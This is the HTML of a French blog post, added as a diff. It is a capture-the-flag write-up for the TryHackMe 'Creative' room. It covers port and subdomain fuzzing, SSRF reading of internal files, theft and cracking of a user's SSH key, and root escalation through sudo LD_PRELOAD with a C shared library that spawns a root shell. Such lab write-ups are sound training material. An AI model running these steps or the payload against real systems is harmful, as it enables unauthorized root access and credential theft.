@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux Ce défi commence par un site web statique qui n&amp;rsquo;est pas exploitable. L&amp;rsquo;énumération des sous-domaines permet de découvrir une application de test d&amp;rsquo;URL vulnérable au SSRF. Cependant, l&amp;rsquo;exploitation complète n&amp;rsquo;est possible qu&amp;rsquo;après la découverte d&amp;rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&amp;rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&amp;rsquo;ancrage." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, TryHackMe" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/04/thm-creative/" />
+
+
+    <title>
+        
+            THM: Creative
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="THM: Creative">
+<meta itemprop="description" content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux Ce défi commence par un site web statique qui n&rsquo;est pas exploitable. L&rsquo;énumération des sous-domaines permet de découvrir une application de test d&rsquo;URL vulnérable au SSRF. Cependant, l&rsquo;exploitation complète n&rsquo;est possible qu&rsquo;après la découverte d&rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&rsquo;ancrage."><meta itemprop="datePublished" content="2024-04-17T22:14:41-05:00" />
+<meta itemprop="dateModified" content="2024-04-17T22:14:41-05:00" />
+<meta itemprop="wordCount" content="826"><meta itemprop="image" content="https://scorpiosec.com/images/THM-Creative/Creative.svg" />
+<meta itemprop="keywords" content="TryHackMe," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/THM-Creative/Creative.svg" /><meta name="twitter:title" content="THM: Creative"/>
+<meta name="twitter:description" content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux Ce défi commence par un site web statique qui n&rsquo;est pas exploitable. L&rsquo;énumération des sous-domaines permet de découvrir une application de test d&rsquo;URL vulnérable au SSRF. Cependant, l&rsquo;exploitation complète n&rsquo;est possible qu&rsquo;après la découverte d&rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&rsquo;ancrage."/>
+
+
+
+    <meta property="og:title" content="THM: Creative" />
+<meta property="og:description" content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux Ce défi commence par un site web statique qui n&rsquo;est pas exploitable. L&rsquo;énumération des sous-domaines permet de découvrir une application de test d&rsquo;URL vulnérable au SSRF. Cependant, l&rsquo;exploitation complète n&rsquo;est possible qu&rsquo;après la découverte d&rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&rsquo;ancrage." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/04/thm-creative/" /><meta property="og:image" content="https://scorpiosec.com/images/THM-Creative/Creative.svg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-17T22:14:41-05:00" />
+<meta property="article:modified_time" content="2024-04-17T22:14:41-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-04-17 22:14:41 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="en" href="https://scorpiosec.com/posts/2024/04/thm-creative/">en</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        4 minutes
+
+         | Aussi disponible en
+          
+              <a href="https://scorpiosec.com/posts/2024/04/thm-creative/"><span class="flag fi fi-gb"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/fr/posts/2024/04/thm-creative/">THM: Creative</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table des matières</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platform: TryHackMe</li>
+<li>Link: <a href="https://tryhackme.com/r/room/creative" target="_blank" >Creative</a>
+
+</li>
+<li>Level: Easy</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Ce défi commence par un site web statique qui n&rsquo;est pas exploitable. L&rsquo;énumération des sous-domaines permet de découvrir une application de test d&rsquo;URL vulnérable au SSRF. Cependant, l&rsquo;exploitation complète n&rsquo;est possible qu&rsquo;après la découverte d&rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&rsquo;ancrage. Une fois la clé SSH obtenue, le hash est craqué, donnant accès au système cible. Enfin, une élévation de privilèges est réalisée en exploitant la variable d&rsquo;environnement <code>LD_PRELOAD</code>.</p>
+<p>Adresse IP cible - <code>10.10.119.61</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Creative 10.10.119.61
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-12 20:52 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.119.61
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.27s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://creative.thm
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 40.97 seconds
+</span></span></code></pre></div><p>Nous avons deux ports ouverts, 22 (SSH) et 80 (Nginx). Nous sommes redirigés vers <code>http://creative.thm</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.119.61 creative.thm&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>Le site web semble plutôt simple, sans aucun élément exploitable.</p>
+<p>L&rsquo;énumération des répertoires et l&rsquo;examen du code source ne donnent rien.</p>
+<p>En utilisant ffuf pour l&rsquo;énumération des sous-domaines, nous trouvons <code>beta</code>.</p>
+<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fc 404 -t 100 -u http://creative.thm -H &#34;Host: FUZZ.creative.thm&#34; -ic -fs 178
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Creative/beta-subdomain.png" alt="Beta subdomain found"></p>
+<p>Après l&rsquo;avoir ajouté au fichier <code>/etc/hosts</code>, nous le visitons et il s&rsquo;avère être un testeur d&rsquo;URL.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/beta-url-tester.png" alt="URL tester website"></p>
+<p>En soumettant <code>http://127.0.0.1:80</code>, on retrouve le contenu de la page principale sans le style, ce qui fait penser à SSRF.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/url-test.png" alt="URL tester SSRF 1"></p>
+<p>Une tentative avec l&rsquo;url <code>http://creative.thm/etc/passwd</code> ne fonctionne pas et renvoie <code>Dead</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/file-read-fail.png" alt="File read attempt failed"></p>
+<p>Essayons de découvrir les ports internes ouverts sur la cible.</p>
+<pre tabindex="0"><code>ffuf -u &#39;http://beta.creative.thm/&#39; -d &#34;url=http://127.0.0.1:FUZZ/&#34; -w &lt;(seq 1 65535) -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -mc all -t 100 -fs 13
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Creative/ffuf-cmd.png" alt="Internal ports fuzzing"></p>
+<p>Le port <code>1337</code> est découvert, en soumettant <code>http://127.0.0.1:1337/</code> nous pouvons lister les répertoires sur le serveur.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/server-directories.png" alt="Directories on the server"></p>
+<p>Avec Burp, nous explorons le système de fichiers et examinons ce que nous pouvons y trouver. Allons dans <code>/home</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/home-dir.png" alt="Home directory via SSRF"></p>
+<p>Dans <code>/home</code> nous trouvons un répertoire pour <code>saad</code>. En allant plus loin avec <code>http://127.0.0.1:1337/home/saad/</code> nous découvrons le dossier <code>.shh</code> et le drapeau de l&rsquo;utilisateur <code>user.txt</code>.</p>
+<p>Il suffit d&rsquo;utiliser <code>http://127.0.0.1:1337/home/saad/user.txt</code> pour révéler le premier drapeau.</p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>En soumettant <code>http://127.0.0.1:1337/home/saad/.ssh/id_rsa</code> nous pouvons récupérer la clé SSH de l&rsquo;utilisateur.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/saad-ssh-key.png" alt="saad user SSH key"></p>
+<blockquote>
+<p>N&rsquo;oubliez pas de configurer les permissions correctes sur la clé avec <code>chmod 600</code>.</p>
+</blockquote>
+<p>La tentative de connexion via SSH échoue parce que nous avons besoin de la phrase secrète de l&rsquo;utilisateur.</p>
+<pre tabindex="0"><code>ssh saad@creative.thm -i id_rsa
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Creative/ssh-fail.png" alt="SSH login failed"></p>
+<p>Nous pouvons utiliser <code>john</code> pour la trouver en convertissant la clé en un hash craquable.</p>
+<pre tabindex="0"><code>ssh2john id_rsa &gt; hash.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Creative/passphrase.png" alt="Hash cracking to recover passphrase"></p>
+<p>Elle est trouvée et nous pouvons maintenant nous connecter.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/foothold.png" alt="Initial foothold via SSH login"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Une des choses que nous devrions toujours vérifier est le fichier <code>.bash_history</code>. Il révèle le mot de passe du compte <code>saad</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/system-password.png" alt="Account password recovered"></p>
+<p>Avec ce mot de passe, nous pouvons lancer <code>sudo -l</code>. L&rsquo;utilisateur est capable de lancer <code>/usr/bin/ping</code> en tant que root.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/sudo-l.png" alt="Sudo -l command"></p>
+<p>Il n&rsquo;y a pas grand chose à faire avec <code>ping</code>. Nous pourrions essayer de remplacer le binaire par un binaire malveillant si nous avions les droits d&rsquo;écriture sur <code>/usr/bin/</code> mais ce n&rsquo;est pas le cas, tous les fichiers appartiennent à root.</p>
+<p><img src="https://scorpiosec.com/images/THM-Creative/ping-binary.png" alt="Ping binary permissions"></p>
+<p>Notre prochaine piste est la variable d&rsquo;environnement <code>LD_PRELOAD</code>.</p>
+<blockquote>
+<p>La mention <code>env_keep+=LD_PRELOAD</code> dans la configuration sudo suggère que <code>saad</code> est autorisé à préserver la variable d&rsquo;environnement <code>LD_PRELOAD</code> lors de l&rsquo;exécution des commandes sudo. Cela pourrait potentiellement être utilisé pour charger des bibliothèques partagées malveillantes.</p>
+</blockquote>
+<p><code>LD_PRELOAD</code> est une variable d&rsquo;environnement sous Linux et d&rsquo;autres systèmes d&rsquo;exploitation de type Unix. Elle permet à l&rsquo;utilisateur de spécifier une liste de bibliothèques partagées supplémentaires à précharger avant toutes les autres lors de l&rsquo;exécution d&rsquo;un programme.</p>
+<p>Un excellent article sur <code>Linux Privilege Escalation using LD_Preload</code> est disponible <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/" target="_blank" >ici</a>
+
+.</p>
+<ol>
+<li>Nous créons un fichier <code>shell.c</code> dans <code>/tmp</code></li>
+</ol>
+<pre tabindex="0"><code>cd /tmp
+nano shell.c 
+</code></pre><p>Ci-dessous le contenu de mon fichier, j&rsquo;ai modifié celui de l&rsquo;article qui me posait des problèmes lors de la compilation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt; // Include this header for setuid() and setgid() functions</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_init</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol start="2">
+<li>Nous compilons et lions <code>shell.c</code> dans une bibliothèque partagée nommée <code>shell.so</code></li>
+</ol>
+<pre tabindex="0"><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Creative/shared-library.png" alt="Shared library permissions"></p>
+<ol start="3">
+<li>Enfin, nous exécutons la commande <code>ping</code> avec la variable d&rsquo;environnement <code>LD_PRELOAD</code> fixée à <code>/tmp/shell.so</code> et nous accédons à root.</li>
+</ol>
+<pre tabindex="0"><code>sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Creative/root-flag.png" alt="Privilege escalation and root flag"></p>
+<p>Ce challenge était assez simple, montrant comment une vulnérabilité peut conduire à une chaîne d&rsquo;exploitation. Il a également mis en évidence la façon dont les mauvaises configurations peuvent être utilisées à l&rsquo;avantage d&rsquo;un attaquant. En attendant le prochain, continuez à apprendre!</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        826 Mots
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-04-17 22:14
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=THM%3a%20Creative&amp;caption=THM%3a%20Creative&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=THM%3a%20Creative&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f;description=THM%3a%20Creative" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f&amp;title=THM%3a%20Creative&amp;summary=THM%3a%20Creative&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f&amp;resubmit=true&amp;title=THM%3a%20Creative" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
